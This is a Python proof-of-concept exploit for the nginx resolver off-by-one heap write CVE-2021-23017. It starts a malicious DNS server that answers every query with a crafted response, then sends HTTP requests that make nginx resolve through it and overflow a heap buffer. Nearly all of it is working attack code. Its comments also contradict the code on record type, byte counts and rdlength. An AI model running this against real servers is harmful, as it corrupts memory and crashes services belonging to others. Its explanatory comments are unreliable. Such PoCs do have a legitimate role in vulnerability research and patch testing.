#!/usr/bin/env python3
"""
PoC for CVE-2021-23017 - nginx resolver off-by-one heap write (CWE-193).

Root cause: ngx_resolver_copy() in src/core/ngx_resolver.c decompresses DNS
names. When a label length plus the running pointer hits a particular boundary,
the loop writes ONE byte past the end of the heap buffer allocated for the
decompressed name (a NUL terminator written at dst[len] where the buffer is
exactly len bytes). Under ASan this is a heap-buffer-overflow WRITE of size 1.

This PoC does two things in one process:
  1. Runs a tiny malicious DNS server on UDP :5353 that answers ANY query for
     the upstream name with a crafted, compression-pointer-laden response whose
     decompressed name length forces the off-by-one.
  2. Fires an HTTP request at nginx (:80) so nginx performs a runtime resolve of
     the upstream name through the configured `resolver 127.0.0.1:5353`,
     reaching ngx_resolver_copy() with our malicious response.

Affected: nginx 0.6.18 - 1.20.0 (fixed 1.20.1 / 1.21.0).
Usage: poc_cve_2021_23017.py [http_host] [http_port] [dns_port]
"""
import socket
import struct
import sys
import threading
import time

HTTP_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
HTTP_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
DNS_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 5353

_stop = threading.Event()


def build_malicious_response(query: bytes) -> bytes:
    """
    Build the exact crafted DNS response from M507/CVE-2021-23017-PoC that drives
    ngx_resolver_copy() (src/core/ngx_resolver.c) one byte past its heap
    allocation.

    Structure:
      [txid (echoed)]
      [flags 0x8180][QD=1 AN=1 NS=0 AR=0]
      [question echoed up to & incl. null, + qtype + qclass]
      [answer name = 0xC0 0x0C  -> pointer to the question name]
      [type A (0x0001)][class IN (0x0001)][ttl 0x00000E10]
      [rdlength 0x000B]
      [rdata: 0x18 (label len 24) + 30*'A' + compression pointer 0xC0 0x04]

    The mismatch between the declared label length (0x18 = 24) and the trailing
    compression pointer (0xC0 0x04, pointing INTO the 12-byte header) makes the
    resolver's name-length accounting in ngx_resolver_copy() off by one, so the
    final NUL terminator is written one byte past the allocated buffer
    -> heap-buffer-overflow WRITE of size 1 (ASan abort).
    """
    txid = query[:2]
    # exact M507/CVE-2021-23017-PoC packet layout (CNAME answer)
    header = b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"

    # Question section: from offset 12 up to & including the null label, then
    # qtype(2) + qclass(2).
    null_idx = 12
    while query[null_idx] != 0:
        null_idx += query[null_idx] + 1
    question = query[12:null_idx + 1]              # qname incl. null
    qtype = query[null_idx + 1:null_idx + 3]
    qclass = query[null_idx + 3:null_idx + 5]

    # CNAME answer header: name ptr 0xC00C, type CNAME (0x0005), class IN, ttl
    ans_hdr = b"\xC0\x0C\x00\x05\x00\x01\x00\x00\x0E\x10"
    # rdlength 0x000B then RDATA: label-len 0x18 (declares 24) but only 22 'A'
    # bytes follow, terminated by compression pointer 0xC0 0x04 (into header).
    # The length/pointer mismatch is what drives ngx_resolver_copy() off-by-one.
    rdata = (
        b"\x00\x0B\x18\x41\x41\x41\x41\x41\x41\x41"
        b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        b"\x41\x41\x41\x41\x41\x41\x41\xC0\x04"
    )

    return txid + header + question + qtype + qclass + ans_hdr + rdata


def dns_server() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", DNS_PORT))
    s.settimeout(0.5)
    print(f"[dns] malicious DNS server on udp/{DNS_PORT}")
    while not _stop.is_set():
        try:
            data, addr = s.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            resp = build_malicious_response(data)
            s.sendto(resp, addr)
            print(f"[dns] answered query from {addr} with {len(resp)}-byte poison")
        except Exception as e:  # noqa: BLE001
            print(f"[dns] failed to build response: {e}")
    s.close()


def fire_http() -> None:
    print(f"[http] requesting http://{HTTP_HOST}:{HTTP_PORT}/ to force a resolve")
    for attempt in range(20):
        try:
            s = socket.create_connection((HTTP_HOST, HTTP_PORT), timeout=3)
            s.sendall(
                f"GET / HTTP/1.1\r\nHost: {HTTP_HOST}\r\nConnection: close\r\n\r\n".encode()
            )
            try:
                s.recv(256)
            except (socket.timeout, ConnectionResetError):
                pass
            s.close()
        except (ConnectionResetError, BrokenPipeError, ConnectionRefusedError):
            print(f"[http] connection error on attempt {attempt} (worker may have crashed)")
            return
        time.sleep(0.4)


def main() -> int:
    t = threading.Thread(target=dns_server, daemon=True)
    t.start()
    time.sleep(0.5)
    fire_http()
    time.sleep(1.0)
    _stop.set()
    return 0


if __name__ == "__main__":
    sys.exit(main())
